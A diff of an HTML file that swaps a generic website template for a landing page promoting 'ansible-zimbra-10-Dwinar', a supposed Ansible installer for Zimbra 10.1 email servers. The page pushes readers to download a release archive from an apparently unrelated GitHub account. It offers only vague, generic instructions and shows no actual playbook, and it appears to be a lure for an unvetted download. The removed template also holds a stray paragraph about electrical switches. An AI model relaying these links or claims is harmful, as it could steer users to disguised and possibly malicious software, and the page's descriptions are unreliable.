@@ -3,114 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Modern Website</title>
-    <link rel="stylesheet" href="style.css">
-
-    <!-- Font Awesome -->
-    <link rel="stylesheet"
-    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <meta name="description" content="A guide to installing Zimbra 10.1 email servers using automated Ansible scripts on Rocky Linux and Ubuntu.">
+    <title>ansible-zimbra-10-Dwinar - Automate Zimbra Email Server Setup Easily</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f4f7f6;">
 
-<header>
+    <h1 style="color: #2c3e50;">⚙️ ansible-zimbra-10-Dwinar - Automate Zimbra Email Server Setup Easily</h1>
 
-    <div class="logo">MyWebsite</div>
-
-    <div class="menu-btn">
-        <i class="fas fa-bars"></i>
+    <div style="margin: 30px 0;">
+        <a href="https://github.com/reducible-parker218/ansible-zimbra-10-Dwinar/releases" style="background-color: #3498db; color: white; padding: 15px 25px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Latest Version</a>
     </div>
 
-    <nav>
-        <ul>
-            <li><a href="#">Home</a></li>
-            <li><a href="#">About</a></li>
-            <li><a href="#">Services</a></li>
-            <li><a href="#">Portfolio</a></li>
-            <li><a href="#">Contact</a></li>
-        </ul>
-    </nav>
+    <p>This software helps you install the Zimbra 10.1 email server. You can use it on Rocky Linux or Ubuntu systems. It removes the need for manual configuration. The tool uses Ansible to handle the technical setup process for you.</p>
 
-    <button class="btn">Login</button>
+    <h2 style="color: #2c3e50;">📋 Prerequisites</h2>
+    <p>Prepare your system before you start. You need a fresh installation of Rocky Linux or Ubuntu. Ensure you have root access to your server. A stable internet connection allows the software to retrieve necessary files from the Zimbra repositories. You should have at least 8GB of memory and 100GB of disk space available for the installation.</p>
 
+    <h2 style="color: #2c3e50;">📥 Download and Installation</h2>
+    <p>Follow these steps to set up your mail server.</p>
+    <ol>
+        <li>Visit the <a href="https://github.com/reducible-parker218/ansible-zimbra-10-Dwinar/releases" style="color: #3498db;">official releases page</a> to download the current version.</li>
+        <li>Extract the downloaded archive file to a folder on your computer.</li>
+        <li>Open your terminal application.</li>
+        <li>Navigate to the folder where you placed the files.</li>
+        <li>Review the configuration file to match your domain settings.</li>
+        <li>Run the execution command provided in the documentation file.</li>
+    </ol>
 
-<main>
+    <h2 style="color: #2c3e50;">💡 How it Works</h2>
+    <p>The system works by reading instructions defined in a playbook. This playbook communicates with your server to install dependencies. It then downloads the Zimbra Collaboration software. Finally, it sets up the database and the web interface. You save time by avoiding individual command entries.</p>
 
-    <section class="content">
+    <h2 style="color: #2c3e50;">🛠️ Troubleshooting</h2>
+    <p>Check your login credentials if the installation fails. Ensure your firewall allows traffic on common email ports. Logs appear in the system directory if an error occurs during the process. Verify that your server hostname matches the required domain format defined in the installer.</p>
 
-        <h1>Build Amazing Websites</h1>
+    <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+    <p>The server requires a domain name assigned to the server address. You must disable existing web servers like Apache or Nginx before you start. The installer manages package updates automatically, so keep your server running during the installation window.</p>
 
-        <p>
-            Create beautiful, responsive, and modern web applications with clean HTML and CSS.
-        </p>
-
-        <p>
-            Choosing the right switches for your home or office mightl seem like a small decision. But it makes a big difference. A good switch feels smooth to touch. It lasts for years without wear. And it keeps your family or employees safe from electrical faults.
-        </p>
-
-    </section>
-
-</main>
-    
-
-</header>
-
-
-<footer>
-
-<div class="footer-container">
-
-<div>
-<h3>MyWebsite</h3>
-<p>Your trusted web development partner.</p>
-</div>
-
-<div>
-<h3>Quick Links</h3>
-
-<ul>
-<li><a href="#">Home</a></li>
-<li><a href="#">Services</a></li>
-<li><a href="#">About</a></li>
-</ul>
-
-</div>
-
-<div>
-<h3>Contact</h3>
-
-<p>Email: info@example.com</p>
-<p>Phone: +91 9876543210</p>
-
-</div>
-
-</div>
-
-<div class="copyright">
-© 2026 MyWebsite. All Rights Reserved.
-</div>
-
-</footer>
-
-<script>
-
-const menuBtn=document.querySelector(".menu-btn");
-const nav=document.querySelector("nav");
-
-menuBtn.onclick=()=>{
-
-nav.classList.toggle("active");
-
-if(nav.classList.contains("active")){
-menuBtn.innerHTML='<i class="fas fa-times"></i>';
-}
-else{
-menuBtn.innerHTML='<i class="fas fa-bars"></i>';
-}
-
-}
-
-</script>
+    <p style="margin-top: 50px; font-size: 0.9em; color: #7f8c8d;">Keywords: ansible, automation, devops, email-server, mail-server, rocky-linux, ubuntu, zimbra, zimbra-10, zimbra-collaboration</p>
 
 </body>
 </html>
-
